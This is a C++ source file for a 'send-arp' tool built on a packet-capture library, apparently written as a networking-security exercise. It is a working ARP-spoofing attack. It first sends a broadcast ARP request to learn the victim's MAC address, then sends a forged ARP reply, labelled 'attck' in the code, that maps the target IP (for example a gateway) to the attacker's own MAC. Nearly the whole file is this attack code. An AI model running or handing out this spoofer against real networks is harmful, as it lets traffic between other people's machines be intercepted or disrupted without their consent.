#include <iostream>
#include <string>
#include <thread>
#include <vector>
#include "net/wnetinfo.h"
#include "net/capture/wpcapdevice.h"
#include "net/process/wpacketdbg.h"
#include "net/pdu/warphdr.h"
#include "net/pdu/wethhdr.h"

bool active = true;

struct WEthArpPacket final {
    WEthHdr eth_;
    WArpHdr arp_;
};

struct WArpInfo {
    WMac senderMac;
};

void usage()
{
    std::cout << "syntax : send-arp <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]" << std::endl;
    std::cout << "sample : send-arp 192.168.10.2 192.168.10.1" << std::endl;
}

int sendArp(WPcapDevice* pcapDevicePtr, std::string senderIp, std::string targetIp)
{
    WEthArpPacket arpReqPkt;
    WPacket arpResPkt;
    WPacket::Result res;
    WBuf buf;
    WArpInfo arpInfo;
    WEthArpPacket atkPkt;

    if (!pcapDevicePtr->open()) {
        std::cout << pcapDevicePtr->err_;
        return -1;
    }

    arpReqPkt.eth_.dmac_ = WMac("ff:ff:ff:ff:ff:Ff");
	arpReqPkt.eth_.smac_ = pcapDevicePtr->intf()->mac();
	arpReqPkt.eth_.type_ = htons(WEthHdr::Arp);
	arpReqPkt.arp_.hrd_ = htons(WArpHdr::ETHER);
	arpReqPkt.arp_.pro_ = htons(WEthHdr::Ip4);
	arpReqPkt.arp_.hln_ = WMac::SIZE;
	arpReqPkt.arp_.pln_ = WIp::SIZE;
	arpReqPkt.arp_.op_ = htons(WArpHdr::Request);
	arpReqPkt.arp_.smac_ = pcapDevicePtr->intf()->mac();
	arpReqPkt.arp_.sip_ = pcapDevicePtr->intf()->ip();
	arpReqPkt.arp_.tmac_ = WMac("00:00:00:00:00:00");
	arpReqPkt.arp_.tip_ = htonl(WIp(senderIp));

    buf.clear();
    buf.data_ = reinterpret_cast<byte*>(&arpReqPkt);
    buf.size_ = sizeof(WEthArpPacket);
    res = pcapDevicePtr->write(buf);
    if (res == WPacket::Result::Fail) return -1;

    while (true) {
        res = pcapDevicePtr->read(&arpResPkt);
        if (res == WPacket::Fail || res == WPacket::Eof) break;
		if (res == WPacket::None) continue;
        if (arpResPkt.arpHdr_->op() != WArpHdr::Reply)
            continue;
        std::cout << std::string(arpResPkt.arpHdr_->smac()) << std::endl;
        arpInfo.senderMac = arpResPkt.arpHdr_->smac();
        break;
    }

    atkPkt.eth_.dmac_ = arpInfo.senderMac;
	atkPkt.eth_.smac_ = pcapDevicePtr->intf()->mac();
	atkPkt.eth_.type_ = htons(WEthHdr::Arp);
	atkPkt.arp_.hrd_ = htons(WArpHdr::ETHER);
	atkPkt.arp_.pro_ = htons(WEthHdr::Ip4);
	atkPkt.arp_.hln_ = WMac::SIZE;
	atkPkt.arp_.pln_ = WIp::SIZE;
	atkPkt.arp_.op_ = htons(WArpHdr::Reply);
	atkPkt.arp_.smac_ = pcapDevicePtr->intf()->mac();
	atkPkt.arp_.sip_ = htonl(WIp(targetIp));
	atkPkt.arp_.tmac_ = arpInfo.senderMac;
	atkPkt.arp_.tip_ = htonl(WIp(senderIp));

    buf.clear();
    buf.data_ = reinterpret_cast<byte*>(&atkPkt);
    buf.size_ = sizeof(WEthArpPacket);
    res = pcapDevicePtr->write(buf);
    std::cout << "attck: " << res << std::endl;

    return 0;
}

int main(int argc, char* argv[])
{
    if (argc < 3 || argc % 2 != 1) {
		usage();
		return -1;
	}

    int count = (argc - 1) / 2;

    WPcapDevice pcapDevice;

    for (int i = 0; i < count; i++) {
        std::string senderIp = argv[2 * i + 1];
        std::string targetIp = argv[2 * (i + 1)];

        WNetInfo& netInfo = WNetInfo::instance();
        WRtm& rtm = netInfo.rtm();
        WRtmEntry* entry = rtm.getBestEntry(WIp(senderIp));
        pcapDevice.intfName_ = entry->intf()->name();

        std::cout << "sendarp: " << sendArp(&pcapDevice, senderIp, targetIp) << std::endl;
    }

    return 0;
}
